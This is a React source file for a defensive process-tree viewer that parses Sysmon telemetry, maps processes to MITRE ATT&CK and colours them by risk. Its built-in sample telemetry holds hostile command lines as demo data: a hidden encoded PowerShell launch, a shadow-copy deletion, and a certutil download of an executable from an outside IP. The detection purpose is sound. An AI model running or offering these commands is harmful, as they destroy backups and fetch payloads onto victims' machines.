/**
 * Process Tree viewer — ingests raw Sysmon / EDR telemetry dumps
 * (XML / JSON / CSV), reconstructs the parent-child process tree,
 * and colors each node by risk (info→green, medium→yellow, high→orange, critical→red).
 */
import { useCallback, useMemo, useState } from "react";
import { toast } from "sonner";
import ReactFlow, { Background, MiniMap, Controls, Handle, Position } from "reactflow";
import "reactflow/dist/style.css";
import { Terminal, Play, Sparkles, ShieldAlert, ShieldCheck, FileWarning, RefreshCw, Upload, X, Send, ChevronDown, FileSpreadsheet, FileJson, FileText } from "lucide-react";

const API = process.env.REACT_APP_BACKEND_URL;

const RISK_STYLE = {
  info:     { border: "#10b981", bg: "#052e2b", text: "#a7f3d0", chip: "bg-emerald-500/15 text-emerald-300 border-emerald-500/40" },
  low:      { border: "#3b82f6", bg: "#0b213d", text: "#bfdbfe", chip: "bg-blue-500/15 text-blue-300 border-blue-500/40" },
  medium:   { border: "#f59e0b", bg: "#3b2707", text: "#fde68a", chip: "bg-amber-500/15 text-amber-300 border-amber-500/40" },
  high:     { border: "#ea580c", bg: "#3b1509", text: "#fed7aa", chip: "bg-orange-500/15 text-orange-300 border-orange-500/40" },
  critical: { border: "#dc2626", bg: "#3b0a0a", text: "#fca5a5", chip: "bg-red-500/15 text-red-300 border-red-500/40" },
};

// Sample telemetry to help users try the feature quickly
const SAMPLE = `<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System><EventID>1</EventID><TimeCreated SystemTime="2024-08-15T10:00:00.123Z"/></System>
    <EventData>
      <Data Name="ProcessGuid">{aaaa-1111}</Data><Data Name="ProcessId">100</Data>
      <Data Name="Image">C:\\Windows\\explorer.exe</Data>
      <Data Name="CommandLine">explorer.exe</Data>
      <Data Name="User">DOMAIN\\alice</Data>
      <Data Name="ParentProcessGuid">{root}</Data>
      <Data Name="ParentImage">C:\\Windows\\System32\\wininit.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System><EventID>1</EventID><TimeCreated SystemTime="2024-08-15T10:00:05Z"/></System>
    <EventData>
      <Data Name="ProcessGuid">{bbbb-2222}</Data><Data Name="ProcessId">2001</Data>
      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -e JABvAHMAIAA9AA==</Data>
      <Data Name="ParentProcessGuid">{aaaa-1111}</Data>
      <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System><EventID>1</EventID><TimeCreated SystemTime="2024-08-15T10:00:06Z"/></System>
    <EventData>
      <Data Name="ProcessGuid">{cccc-3333}</Data><Data Name="ProcessId">2002</Data>
      <Data Name="Image">C:\\Windows\\System32\\vssadmin.exe</Data>
      <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
      <Data Name="ParentProcessGuid">{bbbb-2222}</Data>
      <Data Name="ParentImage">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System><EventID>1</EventID><TimeCreated SystemTime="2024-08-15T10:00:07Z"/></System>
    <EventData>
      <Data Name="ProcessGuid">{dddd-4444}</Data><Data Name="ProcessId">2003</Data>
      <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f https://185.220.101.42/beacon a.exe</Data>
      <Data Name="ParentProcessGuid">{bbbb-2222}</Data>
      <Data Name="ParentImage">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    </EventData>
  </Event>
</Events>`;

function ProcessNode({ data }) {
  const style = RISK_STYLE[data.risk] || RISK_STYLE.info;
  return (
    <div
      className="rounded-md border-2 shadow-lg px-3 py-2 min-w-[210px] max-w-[280px]"
      style={{ background: style.bg, borderColor: style.border }}
    >
      <Handle type="target" position={Position.Top} style={{ background: style.border }} />
      <div className="flex items-center gap-1.5 mb-1">
        <span className="w-1.5 h-1.5 rounded-full" style={{ background: style.border }} />
        <span className="text-[9px] font-bold uppercase tracking-wider" style={{ color: style.text }}>
          {data.risk}
        </span>
        {data.pid && <span className="text-[9px] text-slate-500 font-mono ml-auto">pid {data.pid}</span>}
      </div>
      <div className="text-xs font-bold text-white truncate" title={data.image}>
        {data.image_short || "(unknown)"}
      </div>
      <div className="text-[10px] font-mono text-slate-300 truncate mt-0.5" title={data.command_line}>
        {data.command_line}
      </div>
      {data.techniques?.length > 0 && (
        <div className="flex flex-wrap gap-0.5 mt-1">
          {data.techniques.slice(0, 3).map((t) => (
            <span key={t.id} className={`text-[9px] font-mono px-1 py-0.5 rounded ${style.chip}`} title={t.name}>
              {t.id}
            </span>
          ))}
          {data.techniques.length > 3 && (
            <span className="text-[9px] text-slate-400">+{data.techniques.length - 3}</span>
          )}
        </div>
      )}
      {data.user && (
        <div className="text-[9px] text-slate-500 mt-1 truncate">{data.user}</div>
      )}
      <Handle type="source" position={Position.Bottom} style={{ background: style.border }} />
    </div>
  );
}

const NODE_TYPES = { process: ProcessNode };

// Layered layout: process the tree top-down, distribute nodes horizontally per depth.
function computeLayout(nodes, edges) {
  if (!nodes.length) return { rfNodes: [], rfEdges: [] };
  const NODE_W = 260, X_GAP = 40, Y_GAP = 130;
  const depthGroups = {};
  nodes.forEach((n) => {
    (depthGroups[n.depth ?? 0] ||= []).push(n);
  });
  const rfNodes = [];
  Object.entries(depthGroups).forEach(([depthStr, group]) => {
    const depth = Number(depthStr);
    const rowWidth = group.length * (NODE_W + X_GAP);
    const startX = -rowWidth / 2;
    group.forEach((n, i) => {
      rfNodes.push({
        id: n.id, type: "process", data: n,
        position: { x: startX + i * (NODE_W + X_GAP), y: depth * Y_GAP },
      });
    });
  });
  const rfEdges = edges.map((e, i) => {
    const targetRisk = nodes.find((n) => n.id === e.target)?.risk;
    const style = RISK_STYLE[targetRisk] || RISK_STYLE.info;
    return {
      id: `e-${i}`, source: e.source, target: e.target,
      animated: targetRisk === "critical" || targetRisk === "high",
      style: { stroke: style.border, strokeWidth: 1.5 },
    };
  });
  return { rfNodes, rfEdges };
}

export default function ProcessTreeViewer({ initialTree = null, initialText = "" }) {
  const [text, setText] = useState(initialText);
  const [busy, setBusy] = useState(false);
  const [tree, setTree] = useState(initialTree);

  // Sync when parent passes new pre-parsed data (Auto Investigate flow).
  useMemo(() => { if (initialTree) setTree(initialTree); }, [initialTree]);

  const parse = useCallback(async () => {
    if (!text.trim()) { toast.error("Paste Sysmon telemetry first"); return; }
    setBusy(true);
    setTree(null);
    try {
      const res = await fetch(`${API}/api/cyberlab/process-tree`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input: text }),
      });
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.detail || `HTTP ${res.status}`);
      }
      const data = await res.json();
      setTree(data);
      toast.success(`Parsed ${data.stats.process_count} processes (${data.format?.toUpperCase()}) · worst: ${data.stats.worst_risk}`);
    } catch (e) {
      toast.error(`Parse failed: ${e.message.slice(0, 150)}`);
    } finally { setBusy(false); }
  }, [text]);

  const upload = (e) => {
    const f = e.target.files?.[0]; if (!f) return;
    if (f.size > 8 * 1024 * 1024) { toast.error("Max file size 8 MB"); return; }
    const r = new FileReader();
    r.onload = (ev) => setText(String(ev.target?.result || ""));
    r.readAsText(f);
  };

  const sendToAnalyzer = (t) => {
    try {
      // Ship the full forensic events + IOC list; the analyzer will render both.
      sessionStorage.setItem("nivx.forensicHandoff", JSON.stringify({
        source: "CyberLab · Sysmon Parser",
        format: t.format,
        events: t.forensic_events,
        iocs: t.iocs,
      }));
      // Backwards-compat: also populate the IOC batch for the plain flow.
      sessionStorage.setItem("nivx.iocBatch", JSON.stringify((t.iocs || []).map((i) => i.value)));
      window.location.href = "/threat-intelligence#analyzer";
    } catch (err) {
      toast.error(`Handoff failed: ${err.message}`);
    }
  };

  const layout = useMemo(() => {
    if (!tree) return { rfNodes: [], rfEdges: [] };
    return computeLayout(tree.nodes, tree.edges);
  }, [tree]);

  const stats = tree?.stats || {};

  return (
    <div data-testid="process-tree-viewer">
      {/* Input controls */}
      <div className="mb-3 flex items-start gap-2 flex-wrap">
        <div className="flex-1 min-w-[240px]">
          <div className="flex items-center gap-1.5 mb-1 text-[10px] font-bold uppercase tracking-widest text-slate-400">
            <Terminal className="w-3 h-3" />
            Paste Sysmon telemetry (XML / JSON / CSV)
          </div>
          <textarea
            data-testid="sysmon-input"
            value={text}
            onChange={(e) => setText(e.target.value)}
            placeholder="Paste Sysmon Event ID 1 events — Windows EventLog XML export, Winlogbeat/Elastic JSON, or CSV with headers…"
            className="w-full h-24 font-mono text-[11px] bg-slate-950 border border-slate-800 rounded-md px-2 py-1.5 outline-none focus:border-cyan-500/50 text-slate-100 placeholder-slate-600 resize-y"
          />
        </div>
        <div className="flex flex-col gap-1.5 pt-4">
          <button
            data-testid="parse-sysmon-btn"
            onClick={parse}
            disabled={busy}
            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-md bg-cyan-500 hover:bg-cyan-400 text-slate-900 text-xs font-semibold disabled:opacity-50 transition-colors whitespace-nowrap"
          >
            {busy ? <RefreshCw className="w-3 h-3 animate-spin" /> : <Play className="w-3 h-3" />}
            Parse tree
          </button>
          <button
            data-testid="load-sample-sysmon"
            onClick={() => { setText(SAMPLE); toast.success("Sample loaded"); }}
            className="inline-flex items-center gap-1.5 px-3 py-1 rounded-md border border-slate-700 hover:border-cyan-500/50 text-xs text-slate-300 hover:text-cyan-300 transition-colors whitespace-nowrap"
          >
            <Sparkles className="w-3 h-3" /> Sample
          </button>
          <label className="inline-flex items-center gap-1.5 px-3 py-1 rounded-md border border-slate-700 hover:border-cyan-500/50 text-xs text-slate-300 hover:text-cyan-300 transition-colors cursor-pointer whitespace-nowrap">
            <Upload className="w-3 h-3" /> Upload
            <input type="file" accept=".xml,.json,.csv,.tsv,.log,.txt" className="hidden" onChange={upload} />
          </label>
          {text && (
            <button onClick={() => { setText(""); setTree(null); }} className="inline-flex items-center gap-1 text-[10px] text-slate-400 hover:text-red-400 justify-center">
              <X className="w-3 h-3" /> Clear
            </button>
          )}
        </div>
      </div>

      {tree && (
        <div className="mb-2 flex items-center gap-3 text-[11px] flex-wrap">
          <span className="text-slate-400">
            <span className="font-mono text-white">{stats.process_count}</span> processes ·
            <span className="font-mono text-white ml-1">{stats.edge_count}</span> edges ·
            <span className="font-mono text-white ml-1">{stats.event_count ?? tree.forensic_events?.length ?? 0}</span> events ·
            format <span className="font-mono uppercase text-cyan-300">{tree.format}</span>
          </span>
          {Object.entries(stats.risk_counts || {}).filter(([, v]) => v > 0).map(([risk, count]) => {
            const style = RISK_STYLE[risk] || RISK_STYLE.info;
            return (
              <span key={risk} className={`inline-flex items-center gap-1 text-[10px] font-semibold px-1.5 py-0.5 rounded border ${style.chip}`}>
                <span className="w-1 h-1 rounded-full" style={{ background: style.border }} />
                {count} {risk}
              </span>
            );
          })}
          {stats.worst_risk === "critical" && <ShieldAlert className="w-3 h-3 text-red-400" />}
          {stats.worst_risk === "high" && <FileWarning className="w-3 h-3 text-orange-400" />}
          {(stats.worst_risk === "info" || stats.worst_risk === "low") && <ShieldCheck className="w-3 h-3 text-emerald-400" />}
          {tree.forensic_events?.length > 0 && (
            <button
              data-testid="send-forensics-to-analyzer"
              onClick={() => sendToAnalyzer(tree)}
              className="ml-auto inline-flex items-center gap-1.5 px-3 py-1 rounded-md bg-cyan-500 hover:bg-cyan-400 text-slate-900 text-[11px] font-semibold transition-colors"
            >
              <Send className="w-3 h-3" /> Send to Analyzer
            </button>
          )}
        </div>
      )}

      {/* Canvas */}
      <div className="h-[520px] rounded-md border border-slate-800 bg-slate-950">
        {tree ? (
          <ReactFlow
            nodes={layout.rfNodes}
            edges={layout.rfEdges}
            nodeTypes={NODE_TYPES}
            fitView
            fitViewOptions={{ padding: 0.25, minZoom: 0.3, maxZoom: 1.3 }}
            proOptions={{ hideAttribution: true }}
            panOnDrag zoomOnScroll zoomOnPinch
          >
            <Background color="#334155" gap={20} size={1} />
            <MiniMap
              style={{ background: "#020617", border: "1px solid #1e293b" }}
              nodeColor={(n) => (RISK_STYLE[n.data?.risk] || RISK_STYLE.info).border}
              maskColor="rgba(0,0,0,0.6)"
            />
            <Controls className="[&_button]:!bg-slate-800 [&_button]:!border-slate-700 [&_button]:!text-slate-200" />
          </ReactFlow>
        ) : (
          <div className="h-full flex items-center justify-center text-xs text-slate-500 italic px-8 text-center">
            {busy ? "Parsing telemetry…" : "Paste real Sysmon Event ID 1 data (XML / JSON / CSV) and click Parse tree to reconstruct the attack chain — each process is auto-mapped to MITRE ATT&CK and colored by risk."}
          </div>
        )}
      </div>

      {/* Forensic Events preview table — every event with all forensic fields */}
      {tree?.forensic_events?.length > 0 && (
        <div className="mt-4 rounded-md border border-slate-800 bg-slate-900/40 overflow-hidden" data-testid="forensic-events-table">
          <div className="px-3 py-2 border-b border-slate-800 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <FileText className="w-3.5 h-3.5 text-cyan-400" />
              <span className="text-xs font-bold uppercase tracking-widest text-slate-300">Forensic Events</span>
              <span className="text-[10px] text-slate-500">{tree.forensic_events.length} rows · scroll horizontally to see all fields</span>
            </div>
            {Object.entries(stats.by_action || {}).map(([act, count]) => (
              <span key={act} className="text-[9px] font-mono px-1.5 py-0.5 rounded border border-slate-700 text-slate-400">
                {act}: {count}
              </span>
            )).slice(0, 4)}
          </div>
          <div className="overflow-x-auto max-h-72 overflow-y-auto">
            <table className="w-full text-[11px]">
              <thead className="sticky top-0 bg-slate-900 z-10">
                <tr className="text-left text-[9px] uppercase tracking-widest text-slate-500 border-b border-slate-800">
                  {["Time","Action","Process","PID","Parent","User","File / Target","SHA256","Src IP:Port","Dst IP:Port","Protocol","Domain / URL","MITRE","Risk"].map((h) => (
                    <th key={h} className="px-2 py-1.5 font-semibold whitespace-nowrap">{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                {tree.forensic_events.slice(0, 200).map((e, i) => {
                  const style = RISK_STYLE[e.risk] || RISK_STYLE.info;
                  return (
                    <tr key={i} data-testid={`forensic-row-${i}`} className="hover:bg-slate-800/30">
                      <td className="px-2 py-1 font-mono text-[10px] text-slate-500 whitespace-nowrap">{(e.timestamp || "").slice(0, 19)}</td>
                      <td className="px-2 py-1 whitespace-nowrap"><span className="text-[9px] font-mono px-1.5 py-0.5 rounded border border-slate-700 text-slate-300">{e.action}</span></td>
                      <td className="px-2 py-1 text-white truncate max-w-[130px]" title={e.process_image}>{e.process_name}</td>
                      <td className="px-2 py-1 font-mono text-slate-400">{e.process_id}</td>
                      <td className="px-2 py-1 text-slate-300 truncate max-w-[120px]" title={e.parent_image}>{e.parent_process_name}</td>
                      <td className="px-2 py-1 text-slate-400 truncate max-w-[110px]">{e.user}</td>
                      <td className="px-2 py-1 font-mono text-cyan-300 truncate max-w-[180px]" title={e.file_path}>{e.file_path}</td>
                      <td className="px-2 py-1 font-mono text-[9px] text-slate-500 truncate max-w-[100px]" title={e.file_hash_sha256}>{e.file_hash_sha256 ? e.file_hash_sha256.slice(0, 12) + "…" : ""}</td>
                      <td className="px-2 py-1 font-mono text-slate-300 whitespace-nowrap">{e.src_ip ? `${e.src_ip}:${e.src_port || "?"}` : ""}</td>
                      <td className="px-2 py-1 font-mono text-amber-300 whitespace-nowrap">{e.dst_ip ? `${e.dst_ip}:${e.dst_port || "?"}` : ""}</td>
                      <td className="px-2 py-1 text-slate-400 uppercase text-[9px]">{e.protocol}</td>
                      <td className="px-2 py-1 font-mono text-fuchsia-300 truncate max-w-[180px]" title={e.url || e.domain}>{e.domain || e.url}</td>
                      <td className="px-2 py-1">
                        <div className="flex flex-wrap gap-0.5">
                          {(e.mitre_techniques || []).slice(0, 3).map((t) => (
                            <span key={t.id} title={t.name} className="text-[9px] font-mono text-amber-200">{t.id}</span>
                          ))}
                        </div>
                      </td>
                      <td className="px-2 py-1">
                        <span className={`inline-flex items-center gap-1 text-[9px] font-bold px-1.5 py-0.5 rounded border ${style.chip}`}>
                          <span className="w-1 h-1 rounded-full" style={{ background: style.border }} />
                          {e.risk}
                        </span>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
          {tree.forensic_events.length > 200 && (
            <div className="px-3 py-1.5 text-[10px] text-slate-500 border-t border-slate-800">
              Showing first 200 of {tree.forensic_events.length} events. Download the full report from the Analyzer to see everything.
            </div>
          )}
        </div>
      )}
    </div>
  );
}
